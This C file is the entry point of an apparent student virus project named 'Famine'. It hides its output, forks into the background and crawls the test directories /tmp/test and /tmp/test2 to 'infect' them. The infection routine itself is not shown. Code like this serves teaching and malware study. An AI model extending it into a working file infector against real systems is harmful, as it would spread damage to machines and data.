/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/13 18:19:44 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>

int	mute_outputs()
{
	int	fd = open("/dev/null", O_RDONLY);
	if (fd == -1)
		return (-1);
	
	if (dup2(fd, STDOUT_FILENO) == -1
		|| dup2(fd, STDERR_FILENO) == -1)
	{
		close(fd);
		return (-1);
	}

	close(fd);
	return (0);
}

/*
	Goes over all target directories and infects them
*/
int	crawl()
{
	const char	*TARGET_DIRS[] = {
		"/tmp/test",
		"/tmp/test2"
	};
	#define DIRS_COUNT (sizeof(TARGET_DIRS) / sizeof(char *))

	for (size_t i = 0; i < DIRS_COUNT; i++)
		if (crawl_dir(TARGET_DIRS[i]) == -1)
			return (-1);
	return (0);
}

int	main(void)
{
	if (mute_outputs() == -1)
		return (0);

	int	pid = fork();
	if (pid == -1 || pid != 0)
		return (0);

	if (crawl() == -1)
		return (0);

	// execute infected binary if there is one
	return (0);
}
